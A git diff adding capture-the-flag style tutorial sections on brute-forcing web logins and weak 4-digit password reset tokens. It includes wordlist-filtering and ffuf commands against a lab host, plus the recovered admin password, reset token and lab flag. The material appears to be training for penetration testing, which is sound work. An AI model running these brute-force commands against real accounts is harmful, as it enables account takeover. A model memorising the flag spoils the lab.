@@ -11,7 +11,8 @@ This document covers common techniques for identifying and exploiting vulnerabil
 
     - [Brute Force Attacks](#brute-force-attacks)
         - [Enumerating Users](#enumerating-users)
-
+        - [Brute Forcing Passwords](#brute-forcing-passwords)
+        - [Brute Forcing Password Reset Tokens](#brute-forcing-password-reset-tokens)
 ---
 
 ## Overview
@@ -80,6 +81,8 @@ Common brute forcing tools include:
 - `Hashcat`
 - `JohnTheRipper`
 - `ffuf`
+
+---
 
 ### Enumerating Users
 
@@ -166,5 +169,208 @@ cookster
 ```
 
 ![Filtered output](images/user-enumeration6.PNG)
+
+---
+
+### Brute Forcing Passwords
+
+After identifying valid users, the next logical step is to attempt to brute force corresponding passwords. Users tend to choose easy-to-remember passwords, making brute forcing a viable option. 
+
+In the previous section (`Enumerating Users`), we touched on the issue of username reuse. This same issue exists with passwords, as users tend to utilize the same password across multiple services. In such a scenario, an attacker will try the same password on other services and accounts, often called `Password Spraying`. 
+
+When accessing the target application we get a glimpse of their password policy:
+
+```
+Due to a recent security issue, please update your password to meet the following password policy:
+
+- contains at least one upper-case character
+- contains at least one lower-case character
+- contains at least one digit
+- minimum length of 10 characters
+```
+
+![Filtered output](images/brute-forcing-passwords.PNG)
+
+Based on this information, we can take a large wordlist, such as `rockyou.txt`, and filter it to contain only the passwords that adhere to the targets password policy. This saves a lot of time when brute forcing. 
+
+`rockyou.txt` contains over 14 million passwords:
+
+```bash
+wc -l rockyou.txt
+```
+
+![Filtered output](images/brute-forcing-passwords2.PNG)
+
+When we use `grep` to filter based on the password policy, we reduce the wordlist to around 150 thousand passwords:
+
+```bash
+grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
+```
+
+![Filtered output](images/brute-forcing-passwords3.PNG)
+
+An alternative to the above `grep` command, is to use a single `awk` command:
+
+```bash
+awk 'length($0) >= 10 && /[a-z]/ && /[A-Z]/ && /[0-9]/' rockyou.txt > custom_wordlist.txt
+```
+
+Suppose that we have found a valid username of `admin` by utilizing the techniques covered in the previous section (`Enumerating Users`). When entering an invalid password we get the following error message:
+
+```
+Invalid username or password.
+```
+
+![Filtered output](images/brute-forcing-passwords5.PNG)
+
+We copy the request to file (`req.txt`):
+
+![Filtered output](images/brute-forcing-passwords4.PNG)
+
+We then attempt to brute force the password with `ffuf` and our custom wordlist:
+
+```bash
+ffuf -w custom_wordlist.txt:FUZZ -request req.txt -request-proto -fr "Invalid username or password"
+```
+
+We successfully found the admin password:
+
+```
+admin:Ramirez120992
+```
+
+![Filtered output](images/brute-forcing-passwords5.PNG)
+
+---
+
+### Brute Forcing Password Reset Tokens
+
+Most web applications implement a **password recovery mechanism** to allow users to regain access if they forget their password. This functionality commonly relies on a **one-time password reset token**, which is delivered to the user via email, SMS, or a similar channel.
+
+If the reset token is **weak or predictable** (for example, a short numeric value), it may be possible to brute-force it and reset the password of another user’s account.
+
+To assess the strength of a password reset token, we typically need to:
+
+- Trigger the password reset functionality
+- Intercept and analyze the reset request
+- Identify the token format and validation logic
+
+In this case, the application does **not** allow user registration. However, we already know that a user named `admin` exists. We therefore attempt to reset the administrator’s password.
+
+![Filtered output](images/reset-token.PNG)
+
+The application responds with the following message:
+
+```
+Instructions for resetting your password have been sent to you e-mail address. You can reset it here: <link>
+```
+
+![Filtered output](images/reset-token2.PNG)
+
+Clicking the link redirects us to the password reset page:
+
+```
+http://94.237.55.124:37938/reset_password.php
+```
+
+Immediately upon accessing the page, we receive the following error message:
+
+```
+The provided token is invalid
+```
+
+![Filtered output](images/reset-token3.PNG)
+
+When attempting to reset the password, the application sends a `POST` request to the back-end server with two parameters:
+
+- `token` (passed as a URL parameter)
+- `password` (passed in the request body)
+
+```
+POST /reset_password.php?token=FUZZ
+
+password=password123
+```
+
+![Filtered output](images/reset-token5.PNG)
+
+At this stage, the token structure is unknown. We therefore assume the token may be **weak** and attempt to brute-force it. 
+
+We begin by generating a wordlist containing all possible **4-digit numeric tokens**, padded with leading zeros:
+
+```bash
+seq -w 0 9999 > tokens.txt
+```
+
+The `-w` flag ensures consistent length by **padding** numbers with leading zeros:
+
+```bash
+head tokens.txt
+```
+
+![Filtered output](images/tokens.PNG)
+
+We then insert the `FUZZ` keyword into the request and save it to a file (`req.txt`):
+
+![Filtered output](images/reset-token4.PNG)
+
+We attempt to brute-force the reset token using `ffuf`, filtering out invalid responses:
+
+```bash
+ffuf -w tokens.txt:FUZZ -request req.txt -request-proto http -fr "The provided token is invalid"
+```
+
+This attempt is unsuccessful, suggesting that the token may not be zero-padded.
+
+We generate a second wordlist containing **non-padded** numeric values:
+
+```bash
+seq 0 9999 > tokens.txt
+```
+
+We rerun the brute-force attack using the updated wordlist:
+
+```bash
+ffuf -w tokens.txt:FUZZ -request req.txt -request-proto http -fr "The provided token is invalid"
+```
+
+This time, `ffuf` identifies a valid reset token:
+
+```
+3684
+```
+
+![Filtered output](images/reset-token6.PNG)
+
+We submit the valid token to reset the administrator password to `password123`:
+
+![Filtered output](images/reset-token7.PNG)
+
+Although the application still responds with an error message:
+
+```
+The provided token is invalid
+```
+
+the password change **does in fact succeed**. When attempting to authenticate using the new credentials, we are granted access to the administrator account:
+
+![Filtered output](images/reset-token8.PNG)
+
+After successfully logging in as the administrator, we are able to access the admin dashboard and retrieve the flag:
+
+```
+HTB{36da098385e641d54e1b2750721d816e}
+```
+
+**Summary:**
+
+In this attack, we:
+
+- Identified a weak password reset token mechanism
+- Brute-forced a 4-digit numeric reset token
+- Reset the administrator’s password
+- Successfully compromised the administrator account
+
+This demonstrates how **insufficient entropy in password reset tokens** can lead to full account takeover, even when the application attempts to obscure validation feedback.
 
 ---
